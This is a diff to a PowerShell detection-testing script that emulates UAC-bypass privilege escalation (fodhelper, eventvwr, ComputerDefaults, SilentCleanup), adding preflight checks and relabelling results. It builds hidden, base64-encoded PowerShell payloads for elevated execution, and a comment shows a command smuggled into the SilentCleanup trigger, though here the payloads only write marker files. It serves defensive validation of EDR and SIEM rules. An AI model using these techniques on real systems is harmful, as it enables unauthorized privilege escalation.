@@ -74,17 +74,42 @@ function Get-EncodedCommand {
     return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command))
 }
 
-function Test-ExecutionResult {
-    param([string]$Name)
-    Start-Sleep -Milliseconds 2500
+function Test-IsHighIntegrity {
+    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $integritySid = @($identity.Groups | ForEach-Object { $_.Value } |
+        Where-Object { $_ -match '^S-1-16-\d+$' } | Select-Object -First 1)
+    if ($integritySid.Count -eq 0) { return $false }
+
+    $integrityLevel = [int]($integritySid[0] -split '-')[-1]
+    return $integrityLevel -ge 12288 # High, System, or Protected Process
+}
+
+function Initialize-TestMarker {
+    param([Parameter(Mandatory)][string]$Name)
+
     $marker = "$tempDir\art-v3.2-$Name.txt"
-    if (Test-Path $marker) {
-        Write-Host "[+] SUCCESS: Elevated payload executed - $marker" -ForegroundColor Green
-        return $true
-    } else {
-        Write-Host "[-] FAILED: Payload did not execute at elevated integrity (bypass blocked or UAC prompt shown)" -ForegroundColor Red
-        return $false
-    }
+    Remove-Item -LiteralPath $marker -Force -ErrorAction SilentlyContinue
+    return $marker
+}
+
+function Test-ExecutionResult {
+    param(
+        [string]$Name,
+        [int]$TimeoutSeconds = 5
+    )
+
+    $marker = "$tempDir\art-v3.2-$Name.txt"
+    $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
+    do {
+        if (Test-Path -LiteralPath $marker) {
+            Write-Host "[+] OBSERVED: Payload marker created - $marker" -ForegroundColor Green
+            return $true
+        }
+        Start-Sleep -Milliseconds 250
+    } while ((Get-Date) -lt $deadline)
+
+    Write-Host "[?] NOT OBSERVED: No payload marker within $TimeoutSeconds seconds - $marker" -ForegroundColor Yellow
+    return $false
 }
 
 function Invoke-Cleanup {
@@ -117,7 +142,7 @@ function Test-Fodhelper {
     Write-Host "  EDR alert  - High-integrity child of fodhelper.exe; parent not explorer.exe"
     Write-Host "  SIEM rule  - Process create: IntegrityLevel=High; parent=fodhelper.exe"
 
-    $marker  = "$tempDir\art-v3.2-Fodhelper.txt"
+    $marker  = Initialize-TestMarker -Name 'Fodhelper'
     $cmd     = "Set-Content -Path '$marker' -Value ('[' + (Get-Date) + '] Fodhelper UAC bypass executed')"
     $encoded = Get-EncodedCommand $cmd
     $payload = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded"
@@ -176,7 +201,7 @@ function Test-Eventvwr {
     Write-Host "  EDR alert  - High-integrity child of eventvwr.exe that is not mmc.exe"
     Write-Host "  Rule gap   - If rules only watch fodhelper parent, this bypasses them"
 
-    $marker  = "$tempDir\art-v3.2-Eventvwr.txt"
+    $marker  = Initialize-TestMarker -Name 'Eventvwr'
     $cmd     = "Set-Content -Path '$marker' -Value ('[' + (Get-Date) + '] Eventvwr UAC bypass executed')"
     $encoded = Get-EncodedCommand $cmd
     $payload = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded"
@@ -232,7 +257,7 @@ function Test-ComputerDefaults {
     Write-Host "  EDR alert  - High-integrity child of ComputerDefaults.exe"
     Write-Host "  Rule gap   - Alert fires on fodhelper parent but not ComputerDefaults parent"
 
-    $marker  = "$tempDir\art-v3.2-ComputerDefaults.txt"
+    $marker  = Initialize-TestMarker -Name 'ComputerDefaults'
     $cmd     = "Set-Content -Path '$marker' -Value ('[' + (Get-Date) + '] ComputerDefaults UAC bypass executed')"
     $encoded = Get-EncodedCommand $cmd
     $payload = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded"
@@ -293,7 +318,7 @@ function Test-SilentCleanup {
     Write-Host "  SIEM rule  - Process create: task=SilentCleanup; child!=cleanmgr.exe"
     Write-Host "  Hunt       - Unusual %%windir%% env value in process that triggers schtasks"
 
-    $marker      = "$tempDir\art-v3.2-SilentCleanup.txt"
+    $marker      = Initialize-TestMarker -Name 'SilentCleanup'
     $cmd         = "Set-Content -Path '$marker' -Value ('[' + (Get-Date) + '] SilentCleanup UAC bypass executed')"
     $encoded     = Get-EncodedCommand $cmd
     # cmd /c runs: powershell ... -EncodedCommand [b64] & REM\system32\cleanmgr.exe /autoclean /d c:
@@ -361,16 +386,16 @@ function Test-All {
 function Write-Report {
     param([array]$Results)
     Write-Host "`n+==============================================================================+" -ForegroundColor Cyan
-    Write-Host "|                         EXECUTION REPORT                                    |" -ForegroundColor Cyan
+    Write-Host "|                        OBSERVATION REPORT                                   |" -ForegroundColor Cyan
     Write-Host "+==============================================================================+" -ForegroundColor Cyan
     foreach ($r in $Results) {
-        $label = if ($r.Success) { "BYPASSED" } else { "BLOCKED " }
-        $color = if ($r.Success) { 'Green' }   else { 'Red' }
+        $label = if ($r.Success) { "OBSERVED" } else { "NOT OBSERVED" }
+        $color = if ($r.Success) { 'Green' }   else { 'Yellow' }
         Write-Host "  [$label] $($r.Name)" -ForegroundColor $color
     }
     $ok    = ($Results | Where-Object { $_.Success }).Count
     $total = $Results.Count
-    Write-Host "`n  $ok of $total UAC bypass subtests succeeded" -ForegroundColor Cyan
+    Write-Host "`n  $ok of $total UAC bypass payloads observed" -ForegroundColor Cyan
 }
 
 # ==============================================================================
@@ -379,6 +404,15 @@ function Write-Report {
 
 Write-Host "`n[TEST] UAC Bypass (Technique 3.2)" -ForegroundColor Cyan
 Write-Host "  MITRE: T1548.002  |  Phase 3  |  Privilege Escalation`n"
+
+# This preflight is specific to UAC bypass testing. Other SCT techniques may
+# correctly require elevation; this one must start at Medium integrity to
+# measure an attempted privilege transition.
+if (Test-IsHighIntegrity) {
+    Write-Host '[!] NOT RUN: UAC-bypass testing must start from a Medium-integrity PowerShell session.' -ForegroundColor Yellow
+    Write-Host '    Close this elevated console, open PowerShell normally, then rerun the test.' -ForegroundColor Yellow
+    exit 2
+}
 
 switch ($Subtest) {
     'All' {
@@ -406,8 +440,8 @@ switch ($Subtest) {
             'SilentCleanup'    { Test-SilentCleanup    }
         }
 
-        $color = if ($success) { 'Green' } else { 'Red' }
-        Write-Host "`n[RESULT] Subtest '$Subtest': $(if ($success) { 'BYPASSED' } else { 'BLOCKED' })" -ForegroundColor $color
+        $color = if ($success) { 'Green' } else { 'Yellow' }
+        Write-Host "`n[RESULT] Subtest '$Subtest': $(if ($success) { 'OBSERVED' } else { 'NOT OBSERVED' })" -ForegroundColor $color
         if (-not $NoCleanupPrompt) {
             $c = Read-Host "Clean up now? (Y/N)"
             if ($c -eq 'Y' -or $c -eq 'y') { Invoke-Cleanup -Names @($Subtest) }
